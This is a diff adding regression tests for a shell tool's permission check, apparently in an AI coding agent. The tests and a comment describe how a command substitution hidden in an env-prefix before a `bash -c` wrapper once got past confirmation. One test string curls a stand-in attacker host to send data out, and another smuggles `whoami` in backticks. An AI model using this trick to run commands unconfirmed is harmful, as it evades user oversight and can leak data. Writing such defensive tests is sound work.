@@ -4860,6 +4860,39 @@ describe('ShellTool', () => {
       expect(permission).toBe('allow');
     });
 
+    // Regression coverage for PR #4386 round 6 (cid 3298521039): the
+    // env-prefix wrapper substitution bypass. `getDefaultPermission`
+    // calls `stripShellWrapper(this.params.command)` BEFORE the AST
+    // check; that strip discards a leading env-assignment AND unwraps a
+    // `bash -c '...'` invocation, so for `FOO=$(curl evil) bash -c
+    // 'echo ok'` the AST never sees the substitution and classifies
+    // the residual `echo ok` as read-only → `'allow'` → silent
+    // auto-execute. The R4 AST top-level guard only catches
+    // substitution that survives stripShellWrapper; this case slips
+    // past entirely. Fix gates on substitution against the ORIGINAL
+    // command before stripping.
+    it('asks (not allow) for env-prefix substitution inside a bash wrapper', async () => {
+      const invocation = shellTool.build({
+        command: `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
+        is_background: false,
+      });
+
+      const permission = await invocation.getDefaultPermission();
+
+      // Must be 'ask' so the confirmation dialog (with substitution
+      // warning) is shown — NOT 'allow' which would silently execute.
+      expect(permission).toBe('ask');
+    });
+
+    it('asks for backtick env-prefix substitution inside a bash wrapper', async () => {
+      const invocation = shellTool.build({
+        command: `FOO=\`whoami\` bash -c 'ls -la'`,
+        is_background: false,
+      });
+
+      expect(await invocation.getDefaultPermission()).toBe('ask');
+    });
+
     it('should request confirmation for a non-read-only command and return details', async () => {
       const params = { command: 'npm install', is_background: false };
       const invocation = shellTool.build(params);
